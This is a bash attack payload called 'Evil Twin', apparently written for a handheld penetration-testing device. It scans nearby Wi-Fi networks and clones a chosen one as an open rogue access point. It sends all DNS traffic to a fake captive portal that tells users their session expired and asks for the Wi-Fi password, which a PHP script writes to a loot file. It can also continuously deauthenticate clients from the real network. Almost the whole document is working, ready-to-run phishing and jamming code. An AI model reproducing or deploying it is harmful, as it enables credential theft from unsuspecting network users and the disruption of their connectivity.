#!/bin/bash
# Title: Evil Twin
# Author: bad-antics
# Description: Clone a target network and capture credentials
# Category: nullsec/attack

LOOT_DIR="/mmc/nullsec/eviltwin"
mkdir -p "$LOOT_DIR"

PROMPT "EVIL TWIN ATTACK

Clone a legitimate network
and capture credentials.

1. Scans for target
2. Creates identical AP
3. Deauths real clients
4. Captures login attempts

Press OK to configure."

[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }

SPINNER_START "Scanning networks..."
timeout 12 airodump-ng wlan0 --write-interval 1 -w /tmp/twinscan --output-format csv 2>/dev/null
SPINNER_STOP

NET_COUNT=$(grep -c "WPA\|WEP\|OPN" /tmp/twinscan*.csv 2>/dev/null || echo 0)

PROMPT "Found $NET_COUNT networks

Select target to clone
on next screen."

TARGET_NUM=$(NUMBER_PICKER "Clone network #:" 1)

TARGET_LINE=$(grep "WPA\|WEP\|OPN" /tmp/twinscan*.csv 2>/dev/null | sed -n "${TARGET_NUM}p")
REAL_BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
REAL_CHANNEL=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
TARGET_SSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | tr -d ' ')

PROMPT "TARGET SELECTED

SSID: $TARGET_SSID
BSSID: $REAL_BSSID
Channel: $REAL_CHANNEL

Press OK to configure
attack options."

DEAUTH_REAL=$(CONFIRMATION_DIALOG "Deauth real AP?

Force clients to
reconnect to your
evil twin?")

DURATION=$(NUMBER_PICKER "Duration (seconds):" 300)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=300 ;; esac

CRED_LOG="$LOOT_DIR/twin_$(date +%Y%m%d_%H%M).txt"

resp=$(CONFIRMATION_DIALOG "LAUNCH EVIL TWIN?

Clone: $TARGET_SSID
Deauth Real: $([ \"$DEAUTH_REAL\" = \"$DUCKYSCRIPT_USER_CONFIRMED\" ] && echo Yes || echo No)
Duration: ${DURATION}s

Press OK to attack.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

killall hostapd dnsmasq aireplay-ng 2>/dev/null

# Create fake AP
cat > /tmp/twin_hostapd.conf << EOF
interface=wlan0
driver=nl80211
ssid=$TARGET_SSID
hw_mode=g
channel=$REAL_CHANNEL
auth_algs=1
wpa=0
EOF

# Captive portal page
mkdir -p /tmp/twin_portal
cat > /tmp/twin_portal/index.html << TWINHTML
<!DOCTYPE html>
<html>
<head>
<title>WiFi Login - $TARGET_SSID</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:Arial;background:#f5f5f5;margin:0;padding:20px;}
.container{max-width:400px;margin:50px auto;background:#fff;padding:30px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);}
h1{color:#333;text-align:center;}
.warning{background:#fff3cd;border:1px solid #ffc107;padding:10px;margin:15px 0;border-radius:4px;font-size:13px;}
input{width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box;}
button{width:100%;padding:14px;background:#0066cc;color:white;border:none;border-radius:4px;cursor:pointer;font-size:16px;}
</style>
</head>
<body>
<div class="container">
<h1>📶 $TARGET_SSID</h1>
<div class="warning">⚠️ Session expired. Please re-enter your WiFi password to continue.</div>
<form method="POST" action="/capture.php">
<input type="password" name="password" placeholder="WiFi Password" required>
<input type="hidden" name="ssid" value="$TARGET_SSID">
<button type="submit">Connect</button>
</form>
</div>
</body>
</html>
TWINHTML

cat > /tmp/twin_portal/capture.php << 'CAPPHP'
<?php
\$log = "/mmc/nullsec/eviltwin/twin_" . date("Ymd_Hi") . ".txt";
\$ts = date("Y-m-d H:i:s");
\$ip = \$_SERVER['REMOTE_ADDR'];
\$ssid = \$_POST['ssid'] ?? 'Unknown';
\$pass = \$_POST['password'] ?? '';
file_put_contents(\$log, "[\$ts] SSID:\$ssid IP:\$ip PASS:\$pass\n", FILE_APPEND);
header("Location: /success.html");
?>
CAPPHP

cat > /tmp/twin_portal/success.html << 'SUCCESSHTML'
<!DOCTYPE html>
<html><head><title>Connected</title>
<style>body{font-family:Arial;text-align:center;padding:50px;}.ok{color:#4caf50;font-size:60px;}</style>
</head><body>
<div class="ok">✓</div>
<h1>Connected!</h1>
<p>Reconnecting to network...</p>
</body></html>
SUCCESSHTML

LOG "Starting Evil Twin..."

# Start fake AP
hostapd /tmp/twin_hostapd.conf &
sleep 2
ifconfig wlan0 10.0.0.1 netmask 255.255.255.0 up

# DNS redirect
cat > /tmp/twin_dns.conf << EOF
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.100,5m
address=/#/10.0.0.1
EOF
dnsmasq -C /tmp/twin_dns.conf &

# Web server
cd /tmp/twin_portal
php -S 10.0.0.1:80 &

# Optional deauth
if [ "$DEAUTH_REAL" = "$DUCKYSCRIPT_USER_CONFIRMED" ]; then
    LOG "Deauthing real AP..."
    aireplay-ng -0 0 -a "$REAL_BSSID" wlan0 &
fi

LOG "Evil Twin active: $TARGET_SSID"

sleep $DURATION

# Cleanup
killall hostapd dnsmasq php aireplay-ng 2>/dev/null

CRED_COUNT=$(wc -l < "$CRED_LOG" 2>/dev/null || echo 0)

PROMPT "EVIL TWIN COMPLETE

Cloned: $TARGET_SSID
Duration: ${DURATION}s
Creds Captured: $CRED_COUNT

Log: $CRED_LOG

Press OK to exit."
